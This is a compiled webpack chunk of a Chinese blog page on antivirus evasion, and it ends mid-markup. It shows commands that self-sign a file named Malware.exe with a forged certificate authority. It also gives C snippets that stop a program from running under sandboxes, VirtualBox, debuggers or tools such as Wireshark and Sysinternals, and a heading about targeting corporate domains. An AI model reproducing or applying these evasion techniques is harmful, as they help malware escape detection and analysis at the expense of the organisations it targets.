(window.webpackJsonp=window.webpackJsonp||[]).push([[17],{338:function(s,e,n){"use strict";n.r(e);var a=n(10),t=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"免杀技巧"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#免杀技巧"}},[s._v("#")]),s._v(" 免杀技巧")]),s._v(" "),e("p",[s._v("[TOC]")]),s._v(" "),e("h2",{attrs:{id:"签名二进制文件"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#签名二进制文件"}},[s._v("#")]),s._v(" 签名二进制文件")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer\ncertutil -user -addstore Root MalwrCA.cer\nmakecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer\npvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx\nsigntool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[e("img",{attrs:{src:"https://i.loli.net/2021/03/26/Iqor3YHQLPX8ldz.jpg",alt:"-w1630"}})]),s._v(" "),e("p",[e("img",{attrs:{src:"https://i.loli.net/2021/03/26/GOfIik9pNAjPCxh.jpg",alt:"-w1602"}})]),s._v(" "),e("p",[s._v("这几个工具在Windows SDK里面\n"),e("img",{attrs:{src:"https://i.loli.net/2021/03/26/Iz4tnJ7ifEoV6dQ.jpg",alt:"-w839"}})]),s._v(" "),e("h2",{attrs:{id:"更改依赖项"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#更改依赖项"}},[s._v("#")]),s._v(" 更改依赖项")]),s._v(" "),e("p",[e("img",{attrs:{src:"https://i.loli.net/2021/03/26/Cu53EU8YiDxjves.jpg",alt:"-w952"}})]),s._v(" "),e("h2",{attrs:{id:"动态查杀"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#动态查杀"}},[s._v("#")]),s._v(" 动态查杀")]),s._v(" "),e("h3",{attrs:{id:"wd有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#wd有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。"}},[s._v("#")]),s._v(" WD有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('// check CPU\nSYSTEM_INFO systemInfo;\nGetSystemInfo(&systemInfo);\nDWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;\nif (numberOfProcessors < 2) return false;\n\n// check RAM\nMEMORYSTATUSEX memoryStatus;\nmemoryStatus.dwLength = sizeof(memoryStatus);\nGlobalMemoryStatusEx(&memoryStatus);\nDWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;\nif (RAMMB < 2048) return false;\n\n// check HDD\nHANDLE hDevice = CreateFileW(L"\\\\\\\\.\\\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);\nDISK_GEOMETRY pDiskGeometry;\nDWORD bytesReturned;\nDeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);\nDWORD diskSizeGB;\ndiskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;\nif (diskSizeGB < 100) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br")])]),e("h3",{attrs:{id:"mac地址"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#mac地址"}},[s._v("#")]),s._v(" Mac地址")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('DWORD adaptersListSize = 0;\nGetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &adaptersListSize);\nIP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);\nif (pAdaptersAddresses)\n{\n\tGetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &adaptersListSize);\n\tchar mac[6] = { 0 };\n\twhile (pAdaptersAddresses)\n\t{\n\t\tif (pAdaptersAddresses->PhysicalAddressLength == 6)\n\t\t{\n\t\t\tmemcpy(mac, pAdaptersAddresses->PhysicalAddress, 6);\n\t\t\tif (!memcmp({ "\\x08\\x00\\x27" }, mac, 3)) return false;\n\t\t}\n\tpAdaptersAddresses = pAdaptersAddresses->Next;\n\t}\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br")])]),e("h3",{attrs:{id:"虚拟设备检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#虚拟设备检测"}},[s._v("#")]),s._v(" 虚拟设备检测")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('OBJECT_ATTRIBUTES objectAttributes;\nUNICODE_STRING uDeviceName;\nRtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));\nRtlInitUnicodeString(&uDeviceName, L"\\\\Device\\\\VBoxGuest"); // or pipe: L"\\\\??\\\\pipe\\\\VBoxTrayIPC-<username>"\nInitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);\nHANDLE hDevice = NULL;\nIO_STATUS_BLOCK ioStatusBlock;\nNTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);\nif (NT_SUCCESS(status)) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br")])]),e("h3",{attrs:{id:"hdd-name"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#hdd-name"}},[s._v("#")]),s._v(" HDD Name")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);\nSP_DEVINFO_DATA deviceInfoData;\ndeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);\nSetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);\nDWORD propertyBufferSize;\nSetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);\nPWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);\nSetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);\nCharUpperW(HDDName);\nif (wcsstr(HDDName, L"VBOX")) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("h3",{attrs:{id:"vm-特定文件和注册表检查"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#vm-特定文件和注册表检查"}},[s._v("#")]),s._v(" VM 特定文件和注册表检查")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('// check files\nWIN32_FIND_DATAW findFileData;\nif (FindFirstFileW(L"C:\\\\Windows\\\\System32\\\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;\n\n// check registry key\nHKEY hkResult;\nif (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("h3",{attrs:{id:"文件名称被av更改"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#文件名称被av更改"}},[s._v("#")]),s._v(" 文件名称被AV更改")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('wchar_t currentProcessPath[MAX_PATH + 1];\nGetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);\nCharUpperW(currentProcessPath);\nif (!wcsstr(currentProcessPath, L"C:\\\\USERS\\\\PUBLIC\\\\")) return false;\nif (!wcsstr(currentProcessPath, L"MALWARE.EXE")) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("h3",{attrs:{id:"被父进程启动"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#被父进程启动"}},[s._v("#")]),s._v(" 被父进程启动")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('DWORD GetParentPID(DWORD pid)\n{\n\tDWORD ppid = 0;\n\tPROCESSENTRY32W processEntry = { 0 };\n\tprocessEntry.dwSize = sizeof(PROCESSENTRY32W);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (Process32FirstW(hSnapshot, &processEntry))\n\t{\n\t\tdo\n\t\t{\n\t\t\tif (processEntry.th32ProcessID == pid)\n\t\t\t{\n\t\t\t\tppid = processEntry.th32ParentProcessID;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t} while (Process32NextW(hSnapshot, &processEntry));\n\t}\n\tCloseHandle(hSnapshot);\n\treturn ppid;\n}\n\nvoid main()\n{\n\tDWORD parentPid = GetParentPID(GetCurrentProcessId());\n\tWCHAR parentName[MAX_PATH + 1];\n\tDWORD dwParentName = MAX_PATH;\n\tHANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);\n\tQueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use \'Toolhelp32Snapshot\'\n\tCharUpperW(parentName);\n\tif (wcsstr(parentName, L"WINDBG.EXE")) return;\n\n\twprintf_s(L"Now hacking...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br")])]),e("h3",{attrs:{id:"枚举调试工具抓包工具"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#枚举调试工具抓包工具"}},[s._v("#")]),s._v(" 枚举调试工具抓包工具")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('PROCESSENTRY32W processEntry = { 0 };\nprocessEntry.dwSize = sizeof(PROCESSENTRY32W);\nHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nWCHAR processName[MAX_PATH + 1];\nif (Process32FirstW(hSnapshot, &processEntry))\n{\ndo\n{\n\tStringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);\n\tCharUpperW(processName);\n\tif (wcsstr(processName, L"WIRESHARK.EXE")) exit(0);\n} while (Process32NextW(hSnapshot, &processEntry));\n}\n\nwprintf_s(L"Now hacking...\\n");\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br")])]),e("h3",{attrs:{id:"枚举每个进程的地址空间中加载的模块，并检查不需要的名称"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#枚举每个进程的地址空间中加载的模块，并检查不需要的名称"}},[s._v("#")]),s._v(" 枚举每个进程的地址空间中加载的模块，并检查不需要的名称")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('DWORD runningProcessesIDs[1024];\nDWORD runningProcessesBytes;\nEnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesBytes);\nfor (int i = 0; i < runningProcessesBytes / sizeof(DWORD); i++)\n{\n\tHANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);\n\tif (!hProcess) continue;\n\tHMODULE processModules[1024];\n\tDWORD processModulesBytes;\n\tint s1 = EnumProcessModules(hProcess, processModules, sizeof(processModules), &processModulesBytes);\n\tfor (int j = 0; j < processModulesBytes / sizeof(HMODULE); j++)\n\t{\n\t\tWCHAR moduleName[MAX_PATH + 1];\n\t\tGetModuleFileNameExW(hProcess, processModules[j], moduleName, MAX_PATH);\n\t\tCharUpperW(moduleName);\n\t\tif (wcsstr(moduleName, L"DBGHELP.DLL")) exit(0);\n\t}\n}\n\nwprintf_s(L"Now hacking...\\n");\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br")])]),e("h3",{attrs:{id:"检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较"}},[s._v("#")]),s._v(" 检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)\n{\n\tWCHAR windowTitle[1024];\n\tGetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));\n\tCharUpperW(windowTitle);\n\tif (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;\n\treturn true;\n}\n\nvoid main()\n{\n\tbool debugged = false;\n\tEnumWindows(EnumWindowsProc, (LPARAM)(&debugged));\n\tif (debugged) return;\n\n\twprintf_s(L"Now hacking...\\n");\n}\n\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br")])]),e("h3",{attrs:{id:"check-user-name-computer-name"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#check-user-name-computer-name"}},[s._v("#")]),s._v(" check user name-computer name")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('//check computer name\nDWORD computerNameLength;\nwchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];\nGetComputerNameW(computerName, &computerNameLength);\nCharUpperW(computerName);\nif (wcsstr(computerName, L"DESKTOP-")) return false;\n\n//check user name\nDWORD userNameLength;\nwchar_t userName[UNLEN + 1];\nGetUserNameW(userName, &userNameLength);\nCharUpperW(userName);\nif (wcsstr(userName, L"ADMIN")) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br")])]),e("h3",{attrs:{id:"由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态："}},[e("a",{staticClass:"header-anchor",attrs:{href:"#由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态："}},[s._v("#")]),s._v(" 由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("PWSTR domainName;\nNETSETUP_JOIN_STATUS status;\nNetGetJoinInformation(NULL, &domainName, &status);\nif (status != NetSetupDomainName) return false;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("h3",{attrs:{id:"分辨率检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#分辨率检测"}},[s._v("#")]),s._v(" 分辨率检测")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)\n{\n\tMONITORINFO monitorInfo;\n\tmonitorInfo.cbSize = sizeof(MONITORINFO);\n\tGetMonitorInfoW(hMonitor, &monitorInfo);\n\tint xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;\n\tint yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;\n\tif (xResolution < 0) xResolution = -xResolution;\n\tif (yResolution < 0) yResolution = -yResolution;\n\tif ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)\n\t\t|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))\n\t{\n\t\t*((BOOL*)data) = true;\n\t}\n\treturn true;\n}\n\nvoid main()\n{\n\tMONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;\n\tint xResolution = GetSystemMetrics(SM_CXSCREEN);\n\tint yResolution = GetSystemMetrics(SM_CYSCREEN);\n\tif (xResolution < 1000 && yResolution < 1000)  return false;\n\n\tint numberOfMonitors = GetSystemMetrics(SM_CMONITORS);\n\tbool sandbox = false;\n\tEnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&sandbox));\n\tif (sandbox) return;\n\n\twprintf_s(L"Now hacking...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v